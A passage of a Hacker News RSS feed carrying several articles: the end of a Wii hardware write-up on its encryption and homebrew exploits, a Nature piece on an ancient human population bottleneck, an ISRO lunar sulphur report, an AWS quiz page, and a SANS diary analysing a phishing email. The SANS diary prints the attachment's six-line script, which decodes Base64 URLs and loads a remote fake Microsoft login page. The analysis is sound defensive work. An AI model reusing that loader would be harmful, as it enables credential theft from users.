src="https://www.copetti.org/images/consoles/wii/ingame/strap_warning.418407004e47be1b1b1da7aded4dbcf5cc720aff24188ca663c24a8016b322b2.png" loading="lazy"></picture></a><figcaption>This screen has to be included as well.</figcaption></figure></div><p>Having said that, there are certain features across different games that look awfully identical, somehow. For instance, do you remember the famous <strong>HOME Menu</strong>? Pressing the ‘HOME’ button on the Wiimote will trigger a screen popup in-game, enabling the user to return to the System menu without the need to reboot the console. Considering the OS does not provide this feature, how did every single game manage to come up with the same graphical interface?</p><p>The answer is simple, Nintendo included in their SDK some <strong>mandatory libraries</strong> that games have to embed. <em>Lo and behold</em>, one of them draws that screen. Furthermore, this is the reason you’ll find that only homebrew apps feature ‘original’ designs for the home menu.</p></div><p>The official HOME Menu is one of the 200 or so requirements games had to include, as ruled by the <strong>Wii Programming Guidelines</strong> document (found on the official SDK). Other requirements consisted of displaying the ‘Wii Strap reminder’ screen (which is just a BMP image) at the start of the game, followed by another rule that dictated how to interact with it.</p><h3 id="personalised-titles">Personalised titles</h3><div><p>Another new feature I would like to emphasise is the introduction of <strong>Miis</strong>, some sort of avatars that users could create using a dedicated channel called <em>Mii Channel</em>.</p><p>But the fun didn’t stop there, since games could also fetch these new-created Miis to personalise gameplay.</p></div><hr><h2 id="anti-piracy-homebrew">Anti-Piracy &amp; Homebrew</h2><p>I think the number of features that this console offered made it very attractive for hacking, as cracking the security system would allow homebrew developers to get their hands on the console’s capabilities without having to go through Nintendo’s checks. Be as it may, the Wii ended up having a fantastic Homebrew library.</p><h3 id="copy-protection">Copy protection</h3><p>Let’s start with the common victim: <strong>The disc drive</strong>.</p><p>Wii discs include the aforementioned ‘burst cutting’ area which is inaccessible by conventional readers. So, in the absence of this, the driver will always refuse to read the content.</p><div><figure><a href="https://www.copetti.org/images/consoles/wii/system/disc.610948e09be6c36a4c8ca6cb6b4ca72ae9dc6e7c00b981e47668a5e9ac24d17c.png"><picture><img alt="Image" width="640" height="476" src="https://www.copetti.org/images/consoles/wii/system/disc.610948e09be6c36a4c8ca6cb6b4ca72ae9dc6e7c00b981e47668a5e9ac24d17c.png" loading="lazy"></picture></a><figcaption>The disc drive won’t let anyone pass this screen until a valid disc is inserted.</figcaption></figure><p>Modchip developers discovered that the drive contained a debug interface called ‘Serial Writer’ <sup id="bibref:14"><a href="#bib:anti_piracy-disc" role="doc-biblioref">[14]</a></sup>, though this port is locked until a <em>secret key</em> is entered. Still, it was a matter of time before the key was discovered. Once this happened, modders were able to disable the copy protection and subsequently developed a modchip that automatised this process.</p><p>Matsushita released further revisions of this drive obfuscating the debug interface, however, other flaws in the reader were discovered to re-enable it again.</p></div><p>It’s worth mentioning that the main benefit of modchips was plain piracy, as the disc content is still encrypted, so more research and tools were needed to run custom code.</p><p>GameCube homebrew, on the other hand, was already possible to execute by following <a href="https://www.copetti.org/writings/consoles/gamecube/#tab-5-3-honourable-mention">previous exploits</a> discovered on the predecessor.</p><h3 id="system-encryption">System encryption</h3><p>This is probably the most complex section of this console, yet its never-stopping research opened the door to lots of talented developers and amazing programs.</p><p>The Wii designed its internal security around a couple of cryptographic ciphers (AES, RSA, ECC, SHA-1 and HMAC). To keep explanations easy-to-follow, let’s take a look at each group separately:</p><div><ul><li id="tab-7-1-shared-encryption-link"><a href="#tab-7-1-shared-encryption">Shared encryption</a></li><li id="tab-7-2-chain-of-trust-link"><a href="#tab-7-2-chain-of-trust">Chain of trust</a></li><li id="tab-7-3-starlets-chain-link"><a href="#tab-7-3-starlets-chain">Starlet’s chain</a></li><li id="tab-7-4-more-keys-link"><a href="#tab-7-4-more-keys">More keys</a></li></ul><div><div id="tab-7-1-shared-encryption"><h4 id="tab-7-1-shared-encryption">Shared encryption</h4><p>The communication between many components (NAND, game disc and SD card) is encrypted to avoid being tampered with. Nintendo chose a <strong>symmetric key</strong> system to protect it <sup id="bibref:15"><a href="#bib:anti_piracy-security" role="doc-biblioref">[15]</a></sup>, meaning that the Wii uses the same key to encrypt and decrypt its data.</p><p>Starlet has three 128-bit AES keys stored in its OTP memory <sup id="bibref:16"><a href="#bib:anti_piracy-keys" role="doc-biblioref">[16]</a></sup>, these are written once during manufacturing:</p><ul><li><strong>Common key</strong>: A global key generated by Nintendo that’s found on all Wiis, it is used to decrypt the first layer of encryption used on channels and disc-based games (we’ll refer to them as <strong>titles</strong> from now on).</li><li><strong>SD Key</strong>: This one is used to encrypt/decrypt data transferred to the SD card, and only the System Menu can perform these transfers.<ul><li>Nintendo stored a copy of this key inside IOS for no clear reason.</li></ul></li><li><strong>NAND Key</strong>: This key is randomly generated during the manufacturing process (meaning that it’s unique for every Wii) and it’s used to protect the NAND chip.</li></ul><p>With this, we can see that Starlet is in charge of the encryption/decryption of sensible content, this is why this CPU is the only one that has access to confidential data.</p></div><div id="tab-7-2-chain-of-trust"><h4 id="tab-7-2-chain-of-trust">Chain of trust</h4><p>Titles contain another layer of security, RSA-2048. This is an <strong>asymmetric cipher</strong>, meaning that we need one key to encrypt the content and another one to decrypt it. In a nutshell, this allows Nintendo to encrypt titles using an undisclosed key (called ‘private key’), while the Wii decrypts them using a ‘public key’, which is stored in the console. If hackers were to obtain the public key, it would not be enough to crack the security system, as data is still expected to be encrypted using the private key, which only Nintendo knows.</p><p>Furthermore, RSA is not only used for encrypting content, but also to check the integrity of said encryption. You see, Nintendo uses multiple keys that are used to sign (encrypt) already-encrypted data, forming a chain of encryption with the only purpose of making sure:</p><ul><li>Every single key used has been authorised by Nintendo.</li><li>Data hasn’t been altered and re-encrypted without authorisation.</li></ul><p>Let me give you an example of how this works:</p><ol><li>Nintendo creates a key named <code>x</code>.</li><li>Nintendo programs Starlet to trust content only signed with key <code>x</code>.</li><li>If Starlet finds itself having to decrypt a title with key <code>y</code>, it will only proceed if <code>y</code> has been signed with key <code>x</code>.</li></ol><p>This is called a <strong>Chain of trust</strong>. Outside the Wii, this technique is commonly used to protect most of our communications across the globe (for instance, web browsers using HTTPS rely upon ‘root certificates’ to validate the authenticity of unknown certificates).</p></div><div id="tab-7-3-starlets-chain"><h4 id="tab-7-3-starlets-chain">Starlet’s chain</h4><p>Starlet’s OTP stores public keys (meaning that, for our purposes, it can only decrypt and verify the signature of content). Its chain of trust is made of the following keys <sup id="bibref:17"><a href="#bib:anti_piracy-certificate" role="doc-biblioref">[17]</a></sup>:</p><ul><li><strong>Root Key</strong>: Signs the CA key.<ul><li>Starlet only needs to stores this (public) key, the rest can be decrypted (and subsequently trusted) if it’s been signed by this key.</li></ul></li><li>The <strong>Certification Authority Key</strong> (CA): Signs the XS and CP keys.</li><li>The <strong>XS Key</strong>: This key signs ‘Tickets’, a type of data that contains a list of AES keys needed to decrypt titles (called ‘title keys’).</li><li>The <strong>CP Key</strong>: Once the title is decrypted using the respective title key, the CP key is used to sign the metadata of a title (called ‘TMD’).<ul><li>While it doesn’t sign the content per se, the metadata includes an SHA-1 hash that Starlet uses to verify the integrity of that data.</li></ul></li></ul><p>As you can see, all of this <strong>enables Nintendo to be the sole distributor of content</strong>, which can be a good thing for game studios concerned about piracy.</p></div><div id="tab-7-4-more-keys"><h4 id="tab-7-4-more-keys">More keys</h4><p>This system also contains a pair of <strong>ECC private and public keys</strong>. Elliptic Curve Cryptography (ECC) is another algorithm similar to RSA. In this case, it’s only used to sign the content transferred through the SD card. This is what prevents content copied from one Wii to be used in another one.</p><p>The ECC key is signed by <em>yet another</em> RSA public key called <strong>MS</strong>, which will allow Starlet to trust the ECC key.</p><p>The last key used by this console is the <strong>HMAC key</strong>, which uses another algorithm that combines SHA-1 hashes and HMAC. During the boot process, Starlet checks that NAND hasn’t been altered by third-party hardware. To do that, it computes the SHA-1 hash of NAND and compares it against a hardwired hash to check if they match. In addition to that, the saved hash is signed using the HMAC key to make sure it’s authentic.</p><p>As a final note, the HMAC key is stored in SEEPROM (outside Starlet), not in OTP.</p></div></div></div><p>After all this, it’s worth mentioning that when the system runs GameCube games, <strong>none of the mentioned encryption methods are used</strong>. Instead, Starlet will only check that the game only accesses its designated memory locations. This is because 1/4 of GDDR3 RAM is allocated to simulate old <a href="https://www.copetti.org/writings/consoles/gamecube/#audio">ARAM</a>.</p><h3 id="the-fall-of-encryption">The fall of encryption</h3><p>Let’s start with AES keys, the algorithm may be hard to crack, but if the keys are extracted somehow (especially the common key), that layer of security would be instantly nullified. Thus, the main challenge is <strong>how to extract them</strong>.</p><div><figure><a href="https://www.copetti.org/images/consoles/wii/encryption.7c5aa62de788fd278b94da98c8dd1a968243baca492048e5884a6d211795f86c.png"><picture><img alt="Image" width="507" height="369" src="https://www.copetti.org/images/consoles/wii/encryption.7c5aa62de788fd278b94da98c8dd1a968243baca492048e5884a6d211795f86c.png" loading="lazy"></picture></a><figcaption>Starlet’s security diagram.</figcaption></figure><p>Well, a group of hackers called <strong>Team Twiizers</strong> found out that the lack of signatures on GameCube mode may be a promising attack surface <sup id="bibref:18"><a href="#bib:cpu-ccc" role="doc-biblioref">[18]</a></sup>. They not only discovered that <strong>3/4 of that GDDR3 RAM were not cleared</strong> after running a GC program, but also that by bridging some address points on the motherboard (using a pair of tweezers, nonetheless) they could swap the selected banks of GDDR3 RAM, allowing access to restricted areas. Lo and behold, the AES keys were found residing in there.</p></div><p>Let’s not forget that this only allows to decrypt the ‘first layer’ of security, but in order to execute unsigned programs (Homebrew), RSA has to be cracked too. Unfortunately, this can be computationally impossible… Unless there are flaws in its implementation. Well, Team Twizzers didn’t stop there so they started reversing how IOS was coded, focusing on its signature verification functions.</p><p>RSA signature verification, without going into too much detail, works by comparing the hash of the computed RSA operation against the decrypted signature. After some fiddling, the group discovered something hilarious: <strong>Nintendo implemented this function using <code>strcmp</code></strong> (C’s ‘string’ compare).</p><p>For people unfamiliar with C, <code>strcmp</code> is a routine used for checking if two strings are equal. This method receives three parameters: two strings and an integer, the latter states the number of characters to be compared. Afterwards, strcmp starts comparing each character until the end of any string is reached. Strings in C are just a chain of characters terminated by a <code>\0</code> character, this means that strcmp stops comparing once any string reaches <code>\0</code>. Hence, by composing a Wii title in a way that its hash contains zeroes at the beginning, Starlet RSA computations will feed a string starting with <code>\0</code> to strcmp. Thus, the comparison will always return <code>equal</code>… <strong>Title is signed!</strong></p><p>As if that wasn’t enough, this flaw was discovered on multiple IOS versions - and even in routines found on boot1 and boot2!</p><h3 id="the-dawn-of-homebrew">The dawn of Homebrew</h3><p>After this, there was only one thing left: Make the exploit permanent and implement a ‘user-friendly’ tool, so it could run custom programs without hassle.</p><div><figure><a href="https://www.copetti.org/images/consoles/wii/system/twilight_hack.3860376c5e418ccddbc683a515e3267a240b9603b93f070210aaf45d392e983d.png"><picture><img alt="Image" width="640" height="476" src="https://www.copetti.org/images/consoles/wii/system/twilight_hack.3860376c5e418ccddbc683a515e3267a240b9603b93f070210aaf45d392e983d.png" loading="lazy"></picture></a><figcaption>Running third-party apps was initially done by using a forged save game.</figcaption></figure><p>So far, these exploits required the use of extra hardware, so not every user could make use of it… Until Team Twizzers discovered <em>yet another</em> exploit: A game buffer overflow.</p><p>I’m referring to the famous <strong>The Legend of Zelda: Twilight Princess</strong> (a game by Nintendo, by the way). TT discovered that the game’s save file could be modified to overflow the number of characters used for naming the player’s horse. So, when the player attempts to read the overflowed name, it would trigger a chain reaction ending in arbitrary code execution. This could be used to run, let’s say, a program loader.</p></div><p>Since signatures could now be forged, this crafted save file was easily distributed on the net for other people to use. As a result, the homebrew community was now able to execute their custom software.</p><h3 id="a-permanent-state">A permanent state</h3><p>While further reversing IOS, it was discovered that signatures are only checked during the installation of titles, not during their execution.</p><div><figure><ul><li id="tab-8-1-splash-link"><a href="#tab-8-1-splash">Splash</a></li><li id="tab-8-2-inside-link"><a href="#tab-8-2-inside">Inside</a></li></ul><a id="tab-8-1-splash" href="https://www.copetti.org/images/consoles/wii/system/homebrew_channel.7fd209ca48b7b46a172c00b0b8bdc29e7eb7cf3cc0a9f5f3e109812f8d9f8657.png"><picture><img alt="Image" width="640" height="476" src="https://www.copetti.org/images/consoles/wii/system/homebrew_channel.7fd209ca48b7b46a172c00b0b8bdc29e7eb7cf3cc0a9f5f3e109812f8d9f8657.png" loading="lazy"></picture></a>
<a id="tab-8-2-inside" href="https://www.copetti.org/images/consoles/wii/system/homebrew/menu.b392f256b33a3897d77c3df063e642e9c23031f0532c402cb85fbc455ea8bd5d.png"><picture><img alt="Image" width="640" height="500" src="https://www.copetti.org/images/consoles/wii/system/homebrew/menu.b392f256b33a3897d77c3df063e642e9c23031f0532c402cb85fbc455ea8bd5d.png" loading="lazy"></picture></a><figcaption>The <em>unofficial</em> Homebrew channel (2008).<br>Probably the most user-friendly hack of all times.</figcaption></figure><p>Thus, TT did it again. They carefully forged an installable channel that could load arbitrary programs from the SD card. If this channel were to be installed before Nintendo had taken action to mitigate the security issues, then the Wii would enjoy homebrew permanently (independently of Nintendo patching their signature flaws in the future, which they did).</p><p><strong>Homebrew Channel</strong> was the result of this, this title allowed any user to kickstart homebrew programs that benefited from full control of this system (with all the implications that this means).</p></div><h3 id="nintendos-response">Nintendo’s response</h3><p>For obvious reasons, Nintendo issued several system updates that fixed the signature exploits on multiple versions of IOS, they also took care of their flawed boot stages by shipping new hardware revisions.</p><div><figure><a href="https://www.copetti.org/images/consoles/wii/system/updates.70c280377faf995a29c0f4e2cdfb48c5b652f99e23114fe1fef8f1f5b6afad12.png"><picture><img alt="Image" width="640" height="476" src="https://www.copetti.org/images/consoles/wii/system/updates.70c280377faf995a29c0f4e2cdfb48c5b652f99e23114fe1fef8f1f5b6afad12.png" loading="lazy"></picture></a><figcaption>Lots of these coming through.</figcaption></figure><p>However, there were still fundamental flaws discovered in this system:</p><ul><li>Broadway can reboot Starlet to any IOS version without extra permissions, allowing to exploit non-patched versions.</li><li>Hidden IOS APIs can still be used without special privileges, allowing even more unauthorised control of the hardware.</li><li>The disc drive can receive commands to read conventional DVDs and some IOS contained hidden calls to send those commands. This was particularly worrying for piracy reasons.</li></ul></div><p>So, to wrap this up, what was left after this was just a cat-and-mouse game. Over the next months, different exploits were discovered with Nintendo subsequently trying to patch one after another. This ‘game’ continued until the console reached its end-of-life and no more updates were issued. We can assume the mouse won this one.</p><p>At the time of writing, the exploits mentioned in this article have already been patched, but also replaced with currently working ones.</p><p>I guess there’s no arguing about the impact the hacking scene made on this system, and who can forget the enormous amount of homebrew that was made available (there was even a homebrew ‘store’, which was faster and freer than the official ‘Wii Shop Channel’).</p><hr><h2 id="thats-all-folks">That’s all folks</h2><p>Happy new year 2020!</p><p>This one took me quite a while, I naively predicted that since most of the content was already done for the GameCube, I would just have to write short paragraphs and add links here and there…</p><p>I think it turned out more informational than I expected, so I hope you found it a nice read.</p><p>Until next time!<br>Rodrigo</p></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Modern genetic data suggests pre-humans were a group of only 1,280 individuals (270 pts)]]></title>
            <link>https://www.nature.com/articles/d41586-023-02712-4</link>
            <guid>37343711</guid>
            <pubDate>Thu, 31 Aug 2023 21:08:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/d41586-023-02712-4">https://www.nature.com/articles/d41586-023-02712-4</a>, See on <a href="https://news.ycombinator.com/item?id=37343711">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <figure>
 <picture>
  <source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-023-02712-4/d41586-023-02712-4_25984634.jpg?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-023-02712-4/d41586-023-02712-4_25984634.jpg?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px">
  <img alt="Reconstruction of a specimen of Homo heidelbergensis." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-023-02712-4/d41586-023-02712-4_25984634.jpg">
  <figcaption>
   <p><span>An unknown species of early human nearly died out around 900,000 years ago, according to genetic analysis<i>. </i>It may have been both the ancestor of <i>Homo heidelbergensis</i> and a species ancestral to our own.</span><span>Credit: S. Entressangle/E. Daynes/Science Photo Library</span></p>
  </figcaption>
 </picture>
</figure><p>Human ancestors in Africa were pushed to the brink of extinction around 900,000 years ago, a study shows. The work<sup><a href="#ref-CR1" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">1</a></sup>, published in <i>Science</i>, suggests a drastic reduction in the population of our ancestors well before our species, <i>Homo sapiens</i>, emerged. The population of breeding individuals was reduced to just 1,280 and didn’t expand again for another 117,000 years.</p><p>“About 98.7% of human ancestors were lost,” says Haipeng Li, a population geneticist at the University of Chinese Academy of Sciences in Beijing, who co-led the study. He says that the fossil record in Africa and Eurasia between 950,000 and 650,000 years ago is patchy and that “the discovery of this bottleneck may explain the chronological gap”.</p><p>Nick Ashton, an archaeologist at the British Museum in London, who wrote a related perspective, says he was intrigued by the tiny size of the population. “This would imply that it occupied a very localized area with good social cohesion for it to survive,” he says. “Of greater surprise is the estimated length of time that this small group survived. If this is correct, then one imagines that it would require a stable environment with sufficient resources and few stresses to the system.”</p><h2>Clues from modern-day DNA</h2><p>To make their discovery, the researchers needed to invent new tools. Advances in genome sequencing have improved scientists’ understanding of population sizes for the period after modern humans emerged, but the researchers developed a methodology that enabled them to fill in details about earlier human ancestors. Serena Tucci, an anthropologist at Yale University in New Haven, Connecticut, says that such work was sorely needed. “We still know very little about the population dynamics of early human ancestors for several reasons, including methodological limitations and difficulties in obtaining ancient DNA data from old <i>Homo</i> specimens,” she says.</p><p>The researchers’ method allowed them to reconstruct ancient population dynamics based on genetic data from modern-day humans. By constructing a complex family tree of genes, the team was able to examine the finer branches of the tree with greater precision, identifying significant evolutionary events.</p><p>The technique “put the spotlight on the period 800,000 to one million years ago — for which there is much unknown — in a way that hasn’t been done before,” says Stanley Ambrose, an anthropologist at the University of Illinois at Urbana-Champaign.</p><p>This period was part of the Early-Middle Pleistocene transition — a time of drastic climate change, when glacial cycles became longer and more intense. In Africa, this led to long periods of drought. Li says that the changing climate might have wiped out human ancestors and forced new human species to emerge. Eventually, these might have evolved into the last common ancestor of modern humans and our extinct relatives, the Denisovans and Neanderthals.</p><p>Around 813,000 years ago, the population of pre-humans began to swell again. How our ancestors managed to survive, and what allowed them to flourish once more remains unclear, says Ziqian Hao, a population geneticist at the Shandong First Medical University and Shandong Academy of Medical Sciences in Jinan, and a co-author of the paper. However, he says that the bottleneck is likely to have had a crucial impact on human genetic diversity, driving many important features of modern humans, such as brain size. He estimates that up to two-thirds of genetic diversity was lost. “It represents a key period of time during the evolution of humans. So there are many important questions to be answered,” he says.</p><p>Ashton would like to see the researchers’ findings backed by more archaeological and fossil evidence. The authors “suggest that the bottleneck was a global crash in population,” he says, “but the number of archaeological sites outside Africa suggests that this is not the case. A regional bottleneck might be more likely.”</p>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Elixir/Erlang Secure Coding and Deployment Hardening Guidelines (174 pts)]]></title>
            <link>https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/</link>
            <guid>37343475</guid>
            <pubDate>Thu, 31 Aug 2023 20:47:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/">https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/</a>, See on <a href="https://news.ycombinator.com/item?id=37343475">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="banner">
      
      <h2>Documentation, specifications and code from the Security Working Group of the Erlang Ecosystem Foundation</h2>
      
        <a href="https://github.com/erlef/security-wg">View on GitHub</a>
      
      
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LIBS confirms the presence of sulphur on the lunar surface (101 pts)]]></title>
            <link>https://www.isro.gov.in/LIBSResults.html</link>
            <guid>37342914</guid>
            <pubDate>Thu, 31 Aug 2023 20:00:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.isro.gov.in/LIBSResults.html">https://www.isro.gov.in/LIBSResults.html</a>, See on <a href="https://news.ycombinator.com/item?id=37342914">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-aos="fade-up" id="main">
      <p>
       <h6>
        <span>
            LIBS confirms the presence of Sulphur (S) on the lunar surface through unambiguous in-situ measurements
            
        </span>
        <span>
         <a href="https://www.isro.gov.in/index.html">
          Home
         </a>
         / Flash News: Chandrayaan-3 / LIBS 
        </span>
       </h6>
      </p>
      <div>
        <div>
         <p>
            August 28, 2023
         </p>
         <div>
          <p>
   
           The Laser-Induced Breakdown Spectroscopy (LIBS) instrument onboard Chandrayaan-3 Rover has made the first-ever in-situ measurements on the elemental composition of the lunar surface near the south pole.  These in-situ measurements confirm the presence of Sulphur (S) in the region unambiguously, something that was not feasible by the instruments onboard the orbiters. 
          </p>
          <p>
           LIBS is a scientific technique that analyzes the composition of materials by exposing them to intense laser pulses. A high-energy laser pulse is focused onto the surface of a material, such as a rock or soil. The laser pulse generates an extremely hot and localized plasma. The collected plasma light is spectrally resolved and detected by detectors such as Charge Coupled Devices. Since each element emits a characteristic set of wavelengths of light when it's in a plasma state, the elemental composition of the material is determined. 
          </p>
		  <p>Preliminary analyses, graphically represented, have unveiled the presence of Aluminum (Al), Sulphur (S), Calcium (Ca), Iron (Fe), Chromium (Cr), and Titanium (Ti) on the lunar surface. Further measurements have revealed the presence of manganese (Mn), silicon (Si), and oxygen (O). Thorough investigation regarding the presence of Hydrogen is underway. 
      </p>
          <p>LIBS payload is developed at the Laboratory for Electro-Optics Systems (LEOS)/ISRO, Bengaluru. </p>
          <p>More about LIBS: <span onclick="outsideAlert('https://www.currentscience.ac.in/Volumes/118/04/0573.pdf')" rel="noopener noreferrer" title="More about LIBS">Click here </span></p>
          
          </div>
        </div>
        <div>
         
          
           <p><img alt="LIBS confirms the presence of Sulphur (S) on the lunar surface through unambiguous in-situ measurements" sizes="(max-width:480px) 320px,(max-width:800px) 640px,(max-width:1080px) 1024px,100vw" src="https://www.isro.gov.in/media_isro/image/index/Ch3_1st_libs_plot_2.png" title="LIBS confirms the presence of Sulphur (S) on the lunar surface through unambiguous in-situ measurements">
                             
                             
           </p>
          </div>
         
       
        </div>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The low, low cost of committing cybercrime (123 pts)]]></title>
            <link>https://isc.sans.edu/diary/The+low+low+cost+of+committing+cybercrime/30176</link>
            <guid>37342548</guid>
            <pubDate>Thu, 31 Aug 2023 19:34:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://isc.sans.edu/diary/The+low+low+cost+of+committing+cybercrime/30176">https://isc.sans.edu/diary/The+low+low+cost+of+committing+cybercrime/30176</a>, See on <a href="https://news.ycombinator.com/item?id=37342548">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Those of us who teach security awareness courses are often asked “Why would someone target ME?” or “Why would someone target OUR organization?”. Though these sentiments aren’t nearly as common as they used to be, since even mainstream media seem to cover cyber-attacks on at least a weekly basis, and – as a result – even non-IT specialists are becoming aware of the ubiquity of cyber-attacks, such questions still come up, both when teaching “regular” employees as well as when it comes to board-level security trainings.</p>

<p>To my mind, the old proverb “opportunity makes the thief” describes the main issue with cybercrime quite well – the internet is a very “target-rich” environment, and it is incredibly easy/cheap to create a simple piece of malicious code or launch a basic attack. The aforementioned low costs mean that when it comes to generic attacks, threat actors don’t discriminate, and they target pretty much everyone, and nothing demonstrates this better that generic, “un-targeted” phishing e-mails.</p>

<p>It is, of course, true, that most generic phishing messages will be – either immediately or very soon after they are delivered to their first recipients – detected and blocked by any security solution worth the name, nevertheless, if even one in a thousand or ten thousand e-mails leads to a recipient downloading a malicious file or typing valid credentials into a phishing website, sending such messages out is still a worthwhile endeavor from the threat actors point of view. The fact that their creations are soon being blocked is not necessarily significant since the cost of modifying a phishing message or its attachment or creating a new one is quite low.</p>

<p>Few weeks ago, I came across phishing message, which seemed to me to be a literal manifestation of this "cheap and simple" approach.</p>

<p>The e-mail in question was sent with a spoofed sender address in its header, making it look like it came from the recipient himself. Though this meant that it would be blocked/quarantined if DMARC was properly set up for the domain of the recipient, it also meant that if DMARC (or other relevant filtering mechanism) wasn’t in place and the e-mail made it to the recipient’s inbox, Outlook (and other clients potentially too) might “helpfully” display a photo of the recipient as a sender, should the photo be available as part of the contact information, thus making the e-mail look more legitimate.</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-31-message.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-31-message.png"></a></p>

<p>As you may see, the message subject mentioned a received voice call and the body of the e-mail was left completely empty – so far (besides the spoofed sender address), it was as basic as a malicious e-mail could be. But what made the “simple and cheap” theme complete was the HTML attachment, which only contained the following 6 lines.</p>

<pre><code>&lt;script&gt;
var iam = "[name]@[domain].com";
var gate = "aHR0cHM6Ly9kb25ld2VsbGJ5d2VsbC5jb20vZW5lcmFsLnBocA==";
var crea8 = "aHR0cHM6Ly9kb25ld2VsbGJ5d2VsbC5jb20vcGFnZS5qcw==";
document.write('&lt;script src="'+atob(crea8)+'"&gt;&lt;\/script&gt;');
&lt;/script&gt;</code></pre>

<p>The gate variable contained the Base64-encoded URL hxxps[://]donewellbywell[.]com/eneral[.]php and the crea8 variable contained encoded URL hxxps[://]donewellbywell[.]com/page[.]js. The domain mentioned in the two URLs was registered only two days before the e-mail was sent[<a href="https://whois.domaintools.com/donewellbywell.com">1</a>], which seems to indicate that it was intended to be a disposable domain used (primarily) in this campaign… Which agrees well with the “it’s cheap to do cybercrime” theme.</p>

<p>It probably won’t come as a surprise to you that the JavaScript loaded from the external URL was supposed to display a fake Microsoft login prompt.</p>

<p><a href="https://isc.sans.edu/diaryimages/images/23-08-31-html.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-31-html.png"></a></p>

<p>Though the JavaScript loaded from the external domain was not as simple as the rest of the attack (it was heavily obfuscated and "weight in" at 155 kB) and it might therefore seem like it went against the “cheap and simple” approach, the fact that it was hosted externally allowed for it to be reused between campaigns… Which is what the threat actors did – looking at VirusTotal, one can see that the same JavaScript file has been in use since at least May of this year[<a href="https://www.virustotal.com/gui/file/a7e17ecb0fa26f589bad906ed411af2142fbf9668841f7af613fcb861a672961/relations">2</a>]. Therefore, even if development of the file (or its purchase) might have been somewhat more costly than the rest of the attack, through reuse, it would pay for itself in the long term…<br>
<a href="https://isc.sans.edu/diaryimages/images/23-08-31-vt.png"><img alt="" src="https://isc.sans.edu/diaryimages/images/23-08-31-vt.png"></a></p>

<p>As we can see from this small example, in 2023, it still makes sense for the threat actors to send out an obviously suspicious 6-line HTML file in an empty e-mail with a spoofed sender address… Proving that the cost of committing cybercrime can be really low.</p>

<p>[1] <a href="https://whois.domaintools.com/donewellbywell.com">https://whois.domaintools.com/donewellbywell.com</a><br>
[2] <a href="https://www.virustotal.com/gui/file/a7e17ecb0fa26f589bad906ed411af2142fbf9668841f7af613fcb861a672961/relations">https://www.virustotal.com/gui/file/a7e17ecb0fa26f589bad906ed411af2142fbf9668841f7af613fcb861a672961/relations</a></p>

<p>-----------<br>
Jan Kopriva<br>
<a href="https://twitter.com/jk0pr">@jk0pr</a><br>
<a href="https://www.nettles.cz/">Nettles Consulting</a></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AWS Icon Quiz (260 pts)]]></title>
            <link>https://awsiconquiz.com/</link>
            <guid>37342046</guid>
            <pubDate>Thu, 31 Aug 2023 18:54:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://awsiconquiz.com/">https://awsiconquiz.com/</a>, See on <a href="https://news.ycombinator.com/item?id=37342046">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main" data-framer-hydrate-v2="{&quot;routeId&quot;:&quot;augiA20Il&quot;,&quot;localizationId&quot;:&quot;default&quot;,&quot;localeId&quot;:&quot;default&quot;}" data-framer-ssr-released-at="2023-08-29T09:47:22.822Z" data-framer-page-optimized-at="2023-08-31T22:18:36.824Z"><div data-framer-name="MacBook Pro 14&quot; - 3" name="MacBook Pro 14&quot; - 3"><div data-framer-name="Group 2" name="Group 2"><p><img src="https://framerusercontent.com/images/D8SJEGODtR5QRwuTWJQAdkB8rsY.svg" alt=""></p></div><div data-framer-appear-id="1mumk3c" data-framer-name="Frame 9" name="Frame 9"><p>AWS Icon quiz</p><p>Introducing the AWS Icon Quiz, a thrilling challenge designed to push your AWS knowledge to new heights.</p><a data-framer-name="Frame 6" name="Frame 6" href="https://app.awsiconquiz.com/" rel="noopener"><p>Take the Quiz</p></a></div><div data-framer-appear-id="eatpbj" data-framer-name="Frame 9" name="Frame 9"><p>AWS Icon quiz</p><p>Introducing the AWS Icon Quiz, a thrilling challenge designed to push your AWS knowledge to new heights.</p><a data-framer-name="Frame 6" name="Frame 6" href="https://app.awsiconquiz.com/" rel="noopener"><p>Take the Quiz</p></a></div><div data-framer-appear-id="dre17g" data-framer-name="Frame 9" name="Frame 9"><p>AWS Icon quiz</p><p>Introducing the AWS Icon Quiz, a thrilling challenge designed to push your AWS knowledge to new heights.</p><a data-framer-name="Frame 6" name="Frame 6" href="https://app.awsiconquiz.com/" target="_blank" rel="noopener"><p>Take the Quiz</p></a></div><div data-framer-appear-id="1e2w9u9" data-framer-name="Frame 13" name="Frame 13"><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon quiz//</p><p>AWS icon 